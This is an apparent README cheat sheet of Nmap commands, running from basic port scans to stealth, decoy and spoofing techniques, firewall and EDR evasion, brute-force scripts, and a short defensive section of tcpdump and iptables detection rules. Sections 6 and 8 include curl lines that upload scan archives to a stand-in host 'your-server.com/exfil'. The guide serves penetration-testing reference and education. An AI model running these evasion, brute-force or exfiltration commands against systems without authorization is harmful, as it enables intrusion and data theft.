# Nmap-dictionary
Nmap commands from beginner level to advanced level that are categorized in the most simple way 

> **⚠️ Legal Disclaimer**  
> This guide is for **educational purposes only**. Nmap is a powerful tool. Unauthorized scanning of networks you do not own or have explicit permission to test may be illegal in your jurisdiction. The author assumes no responsibility for misuse or damage caused by these commands. Know the laws where you live. Scan responsibly.


> 📄 **Quick Reference:** [One-page cheat sheet](QUICKREF.md) for the most common commands.

## 📖 Table of Contents

1. [The Fundamentals](#1-the-fundamentals)

2. [Network Discovery](#2-network-discovery)

3. [Stealth and Evasion](#3-stealth-and-evasion)

4. [Advanced Scanning Technique](#4-advanced-scanning-technique)

5. [Service and Vulnerability Discovery](#5-service-and-vulnerability-discovery)

6. [Output and Exfiltration](#6-output-and-exfiltration)

7. [Timing and Performance](#7-timing-and-performance)

8. [Exfiltration and Post-Processing](#8-exfiltration-and-post-processing)

9. [Target-Specific Commands](#9-target-specific-commands)

10. [Aggressive Commands](#10-aggressive-commands)

11. [IPv6 Scanning](#11-ipv6-scanning)

12. [Firewall Evasion](#12-firewall-evasion)

13. [NSE Script Development](#13-nse-script-development)

14. [Advanced Output Parsing](#14-advanced-output-parsing-1000-hosts)

15. [Scan Automation](#15-scan-automation-multiple-networks)

16. [Defense (Identifying Enemies)](#16-defense-identifying-enemies)

17. [Evading Modern EDR](#17-evading-modern-edr)






   ## 1. THE FUNDAMENTALS
 
  - Quick port scan with version detection
```bash
nmap -sV -T4 192.168.1.1
```
- Full port scan (slow but thorough)
```bash
nmap -p- -sV -T4 192.168.1.1
```
- Aggressive scan (OS, version, scripts, traceroute)
```bash
nmap -A -T4 192.168.1.1
```
- UDP scan (find DNS, SNMP, other non‑TCP services)
```bash
 nmap -sU 192.168.1.1
```
- Save everything (normal, XML, grepable)
```bash
nmap -oA scan_name -A -T4 192.168.1.0/24 
```   

[🔝 Back to Top](#📖-table-of-contents)


   ## 2. NETWORK DISCOVERY 

- Ping sweep - find live hosts
```bash
nmap -sn 192.168.1.0/24
```
- ARP ping (works even when ICMP is blocked, needs root)
```bash
nmap -sn -PR 192.168.1.0/24
```
- TCP SYN ping (bypasses firewall rules)
```bash
nmap -sn -PS 443,80 192.168.1.0/24
```
- Fast host discovery with traceroute
```bash
nmap -sn --traceroute 192.168.1.0/24
```


[🔝 Back to Top](#📖-table-of-contents)


  ##  3. STEALTH AND EVASION
        
- Sneaky scan (slow, hard to detect)
```bash
nmap -T1 -sS 192.168.1.1
```
- Decoy scan (hide your IP among 10 random hosts)
```bash
nmap -D RND:10 -sS 192.168.1.1
```
- Fragment packets (evade simple firewalls)
```bash
nmap -f -sS 192.168.1.1
```
- MAC spoofing (needs root)
```bash
nmap --spoof-mac 0 192.168.1.1
```
- Source port manipulation (pretend to be DNS)
```bash
nmap --source-port 53 -sS 192.168.1.1
```
- Idle scan (use a zombie host, advanced)
```bash
nmap -sI zombie_ip 192.168.1.1
```

[🔝 Back to Top](#📖-table-of-contents)


   ## 4. ADVANCED SCANNING TECHNIQUE

- TCP Null scan (evade non-stateful firewalls)
```bash
nmap -sN 192.168.1.1
```
- TCP FIN scan
```bash
nmap -sF 192.168.1.1
```
- TCP Maimon scan
```bash
nmap -sM 192.168.1.1
```
- ACK scan (map firewall rules)
```bash
nmap -sA 192.168.1.1
```
- Window scan (same as ACK but better)
```bash
nmap -sW 192.168.1.1
```
- Custom packet scan 
```bash
nmap --scanflags SYN,URG 192.168.1.1
```

[🔝 Back to Top](#📖-table-of-contents)


   ## 5. SERVICE AND VULNERABILITY DISCOVERY 

- Version detection with intensity (0-9, higher is slower but deeper)
```bash
nmap -sV --version-intensity 9 192.168.1.1
```
- Service scan with default scripts
```bash
nmap -sC -T4 192.168.1.1
```
- Vulnerability scan (noisy, but effective)
```bash
nmap --script vuln -T4 192.168.1.1
```
- Specific vulnerability scripts
```bash
nmap --script http-vuln-*,smb-vuln-* -T4 192.168.1.1
```
- Brute force default credentials (dangerous) 
```bash
nmap --script brute 192.168.1.1
```
- SMTP open relay check
```bash
nmap --script smtp-open-relay -p 25 192.168.1.1
```
- DNS enumeration
```bash
nmap --script dns-recursion,dns-zone-transfer -p 53 192.168.1.0/24
```

[🔝 Back to Top](#📖-table-of-contents)


   ## 6. OUTPUT AND EXFILTRATION 

- Save all formats
```bash
nmap -oA scan_name 192.168.1.0/24
```
- Grepable output for scripting
```bash
nmap -oG scan.grep 192.168.1.0/24
```
- Extract IPs from scan
```bash
grep "Nmap scan report" scan.txt | awk '{print $5}' > live_hosts.txt
```
- Extract open ports
```bash
grep "open" scan.txt | awk '{print $1, $3}' > open_ports.txt
```
- For exfiltration: compress and send to your server
```bash
tar -czf scan_results.tar.gz scan.txt scan.xml scan.grep
curl -F "file=@scan_results.tar.gz" http://your-server.com/upload
```

[🔝 Back to Top](#📖-table-of-contents)


  ##  7. TIMING AND PERFORMANCE 

- Paranoid (0.1s delay, avoid IDS)
```bash
nmap -T0 -sS 192.168.1.1
```
- Sneaky (15s delay, still evasive)
```bash
nmap -T1 -sS 192.168.1.1
```
- Polite (0.4s delay, normal)
```bash
nmap -T2 -sS 192.168.1.1
```
- Normal (default)
```bash
nmap -T3 -sS 192.168.1.1
```
- Aggressive (fast, might drop packets)
```bash
nmap -T4 -sS 192.168.1.1
```
- Insane (very fast, likely to trigger alerts)
```bash
nmap -T5 -sS 192.168.1.1
```
- Max rate (overkill, for when you don't care about stealth)
```bash
nmap --min-rate 10000 -p- 192.168.1.1
```

[🔝 Back to Top](#📖-table-of-contents)


  ##  8. EXFILTRATION AND POST-PROCESSING 

- Step 1: Host discovery (fast)
```bash
nmap -sn 192.168.1.0/24 -oG live_hosts.grep
```
- Step 2: Extract IPs to file
```bash
grep "Up" live_hosts.grep | cut -d' ' -f2 > ip_list.txt
```
- Step 3: Deep scan each host
```bash
   while read ip; do
      nmap -sV -A -T4 "$ip" -oN "scan_${ip}.txt"
  done < ip_list.txt
```
- Step 4: Extract interesting data
```bash
grep -E "open|VERSION|OS" scan_*.txt > interesting_results.txt
```
- Step 5: Exfiltrate to your server 
```bash
tar -czf batch_scan.tar.gz scan_*.txt interesting_results.txt
curl -X POST -F "data=@batch_scan.tar.gz" http://your-server.com/exfil
```

[🔝 Back to Top](#📖-table-of-contents)


   ## 9. TARGET-SPECIFIC COMMANDS 

- Web server enumeration
```bash
nmap --script http-enum,http-headers,http-title -p 80,443,8080 192.168.1.1
```
- SMB enumeration (Windows networks)
```bash
nmap --script smb-os-discovery,smb-security-mode -p 445 192.168.1.0/24
```
- SSH enumeration
```bash
nmap --script ssh-auth-methods,ssh-hostkey -p 22 192.168.1.1
```
- FTP enumeration
```bash
nmap --script ftp-anon,ftp-bounce -p 21 192.168.1.1
```
- Database enumeration (MySQL, PostgreSQL, MongoDB)
```bash
nmap --script mysql-info,postgres-brute,mongodb-databases -p 3306,5432,27017 192.168.1.1
```
- SNMP enumeration (often forgotten)
```bash
nmap --script snmp-community,snmp-info -p 161 192.168.1.0/24
```

[🔝 Back to Top](#📖-table-of-contents)


## 10. AGGRESSIVE COMMANDS 

- Full aggressive on entire subnet
```bash
nmap -A -T4 -p- 192.168.1.0/24 -oA full_subnet_scan
```
- Vulnerability scan with maximum intensity
```bash
nmap --script vuln --script-args vulns.timeout=30s -T4 192.168.1.1
```
- Brute force default credentials on multiple services
```bash
nmap --script brute -p 21,22,23,80,443,445,3306,3389 192.168.1.1
```
- Fast port discovery + deep scan (two-pass)
```bash
nmap -p- --min-rate 10000 -T4 192.168.1.1 -oN fast_ports.txt
nmap -sV -A -p $(grep -E "^[0-9]" fast_ports.txt | cut -d'/' -f1 | tr '\n' ',') 192.168.1.1
```

[🔝 Back to Top](#📖-table-of-contents)


## 11. IP V6 SCANNING 
   
- IPv6 ping sweep (find live hosts)
```bash
nmap -6 -sn 2001:db8::/32
```
- IPv6 version scan
```bash
nmap -6 -sV -T4 2001:db8::1
```
- IPv6 full port scan (slow but thorough)
```bash
nmap -6 -p- -sV -T4 2001:db8::1
```
- IPv6 aggressive scan
```bash
nmap -6 -A -T4 2001:db8::1
```
- IPv6 traceroute
```bash
nmap -6 --traceroute 2001:db8::1
```
- IPv6 script scan
```bash
nmap -6 --script smb-os-discovery -p 445 2001:db8::1
```
- IPv6 firewall evasion (some firewalls don't inspect IPv6 properly)
```bash
nmap -6 -f -sS 2001:db8::1
```

[🔝 Back to Top](#📖-table-of-contents)


## 12. FIREWALL EVASION 

- Randomize host order (evade pattern-based detection)
```bash
nmap --randomize-hosts 192.168.1.0/24
```
- Append random data to packets (evade signature detection)
```bash
nmap --data-length 200 192.168.1.1
```
- Specify minimum TTL (evade TTL-based filters that drop packets with odd TTLs)
```bash
nmap --ttl 128 192.168.1.1
```
- Send bad checksums (some IDS systems ignore bad checksums, older systems process them)
```bash
nmap --badsum 192.168.1.1
```
- Use specific source IP (spoofing, requires root and network access)
```bash
nmap -S 10.10.10.10 -e eth0 192.168.1.1
```
- IP fragmentation with specific offset (evades older firewalls)
```bash
nmap -f --mtu 8 192.168.1.1
```
- SCTP scan (less common, often not monitored)
```bash
nmap -sY -T4 192.168.1.1
```
- Custom packet timing (evade rate-based detectors)
```bash
nmap --scan-delay 1s --max-retries 0 192.168.1.1
 ```

[🔝 Back to Top](#📖-table-of-contents)


## 13. NSE SCRIPT DEVELOPMENT 

- List all scripts by category
```bash
ls /usr/share/nmap/scripts/*.nse
```
- Search for scripts by keyword
```bash
grep -r "smb" /usr/share/nmap/scripts/
```
- Run a script with custom arguments
```bash
nmap --script smb-os-discovery --script-args smb-os-discovery.verbose=true 192.168.1.1
```
- Run a custom script 
```bash
nmap --script ./my_custom_script.nse 192.168.1.1
```
- Debug script execution
```bash
nmap --script-trace --script http-enum 192.168.1.1
```
---CUSTOM TEMPLATE 
  ```bash
  -- Place this in ~/.nmap/scripts/my_http_check.nse
local http = require "http"
local nmap = require "nmap"
local stdnse = require "stdnse"

portrule = function(host, port)
    return port.number == 80 and port.state == "open"
end

action = function(host, port)
    local path = "/admin"
    local response = http.get(host, port, path)
    if response.status == 200 then
        return string.format("Admin panel found at %s%s", host.ip, path)
    end
    return nil
end
```

[🔝 Back to Top](#📖-table-of-contents)


## 14. ADVANCED OUTPUT PARSING (+1000 HOSTS)

- Extract IP:port pairs from grepable output
```bash
grep -E "^Host:" scan.grep | cut -d' ' -f2,4 | tr ' ' ':' > ip_port_pairs.txt
```
- Generate a list of hosts with specific open ports
```bash
grep -E "^Host:.*80/open" scan.grep | cut -d' ' -f2 > web_hosts.txt
```
- Create CSV for reporting (for pentests)
```bash
echo "IP,Port,Service,Version" > report.csv
grep "open" scan.txt | awk '{print $1","$3","$4","$5}' >> report.csv
```
- Find hosts with a specific vulnerability
```bash
grep -B 2 "VULNERABLE" scan.txt | grep "Nmap scan report" | awk '{print $5}' > vulnerable_hosts.txt
```
- Generate unique list of services found
```bash
grep "open" scan.txt | awk '{print $3}' | sort | uniq -c | sort -rn > service_counts.txt
```

[🔝 Back to Top](#📖-table-of-contents)


## 15. Scan Automation (multiple networks)

- Scan multiple subnets from a list
  while read subnet; do
```bash
    nmap -sn "$subnet" -oG "scan_$(echo "$subnet" | tr '/' '_').grep"
  done < subnets.txt
```
- Scan all hosts from a list
while read ip; do
```bash
    nmap -sV -T4 "$ip" -oN "scan_${ip}.txt"
done < ip_list.txt
```
- Parallel scanning (faster, but more aggressive)
```bash
cat ip_list.txt | xargs -I {} -P 5 nmap -sV -T4 {} -oN "scan_{}.txt"
```
- Scan based on open ports from previous scan
```bash
open_ports=$(grep "open" previous_scan.txt | cut -d'/' -f1 | sort -u | tr '\n' ',')
nmap -p "$open_ports" -sV -T4 192.168.1.0/24
```

[🔝 Back to Top](#📖-table-of-contents)


## 16. DEFENSE (identifying enemies)

- Detect SYN scans
```bash
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0'
```
- Detect FIN scans
```bash
tcpdump -i eth0 'tcp[tcpflags] & (tcp-fin) != 0'
```
- Detect XMAS scans (FIN, URG, PSH)
```bash
tcpdump -i eth0 'tcp[tcpflags] & (tcp-fin|tcp-urg|tcp-psh) == (tcp-fin|tcp-urg|tcp-psh)'
```
- Detect NULL scans
```bash
tcpdump -i eth0 'tcp[tcpflags] == 0'
```
- Detect fragmented packets (evasion attempt)
```bash
tcpdump -i eth0 'ip[6:2] & 0x1fff != 0'
```
- Rate-limit ICMP ping sweeps (prevent discovery)
```bash
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/second --limit-burst 5 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
```
- Rate-limit TCP scans (prevent port scanning)
```bash
iptables -A INPUT -p tcp --syn -m recent --name portscan --set -j DROP
iptables -A INPUT -p tcp --syn -m recent --name portscan --rcheck --seconds 60 --hitcount 10 -j DROP
```
- Log and drop scanners
```bash
iptables -A INPUT -p tcp --syn -m recent --name portscan --rcheck --seconds 60 --hitcount 10 -j LOG --log-prefix "PORT_SCAN: "
iptables -A INPUT -p tcp --syn -m recent --name portscan --rcheck --seconds 60 --hitcount 10 -j DROP
```

[🔝 Back to Top](#📖-table-of-contents)


## 17. EVADING MODERN EDR

- Slow down to avoid behavioral detection
```bash
nmap -T1 --max-retries 0 --min-rtt-timeout 1000 192.168.1.1
```
- Randomize scan order (evade pattern-based alerts)
```bash
nmap --randomize-hosts 192.168.1.0/24
```
- Use non-standard ports (many EDR solutions only monitor common ports)
```bash
nmap -sS -p 8080,8443,4443 192.168.1.1
```
- Spread scan over time (avoid real-time detection)
```bash
nmap -T0 --scan-delay 30s -p 1-1000 192.168.1.1
```
- Use decoy scans from legitimate IPs
```bash
nmap -D 8.8.8.8,1.1.1.1,ME 192.168.1.1
```
---------------------------------------

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
